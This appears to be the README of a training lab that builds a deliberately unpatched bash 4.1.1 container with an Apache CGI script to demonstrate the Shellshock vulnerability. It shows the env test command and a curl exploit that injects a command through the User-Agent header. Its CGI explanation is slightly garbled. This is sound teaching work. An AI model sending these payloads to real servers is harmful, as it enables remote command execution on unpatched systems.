# shellshock-lab

This is a playground to investigate and emulate the infamous `shellshock` vulnerability in `bash` (CVE-2014-6271, CVE-2014-7169, CVE-2014-7186 CVE-2014-7186).

## About Shellshock

`https://en.wikipedia.org/wiki/Shellshock_(software_bug)`

Shellshock is a critical vulnerability discovered in older versions of the Bash shell. It allows attackers to execute arbitrary commands by injecting malicious code 
into specially crafted environment variables. The vulnerability occurs during the initialization of a new Bash process, 
where Bash improperly processes function definitions within environment variables.

```bash
env x='() { :;}; echo vulnerable!' bash -c ""
```
In vulnerable Bash versions, the above command will execute echo vulnerable! because Bash misinterprets additional code after the function definition.

### CVE identifiers

- CVE-2014-6271 (initial),
- CVE-2014-6277,
- CVE-2014-6278,
- CVE-2014-7169,
- CVE-2014-7186,
- CVE-2014-7187

### Key impacts

- Shellshock is dangerous because environment variables can be passed to Bash from external sources, such as web servers (via CGI scripts), SSH, or other services.
- Attackers can use this to compromise systems and execute arbitrary commands.



## Repo Content

- `image/` - contains everything that is needed to build a vulnerable, unpatched image of bash (`4.1.1`)

## Building the image

From within the image directory...

```bash
docker build -t shellshock-lab:latest .
```

## Running the container

```bash
docker run --rm -p 2222:22 -p 8080:80 -p 8443:443 -it shellshock-lab:latest
```

## Exploit using CGI scripts

The container runs an Apache server with a CGI script that is vulnerable to `shellshock`. The script is located at `/usr/lib/cgi-bin/submit-comment.cgi`,
and can be accessed via `http://localhost:8080/cgi-bin/submit-comment.cgi`.

`apache2` automatically sets the `User-Agent` header to the value of the `User-Agent` HTTP header. This means that the `User-Agent` header can be used to exploit the `shellshock` vulnerability.

```bash
curl --header 'User-Agent: () { :;}; /bin/bash -c "echo pwned > /tmp/test"' http://localhost:8080/cgi-bin/submit-comment.cgi
```
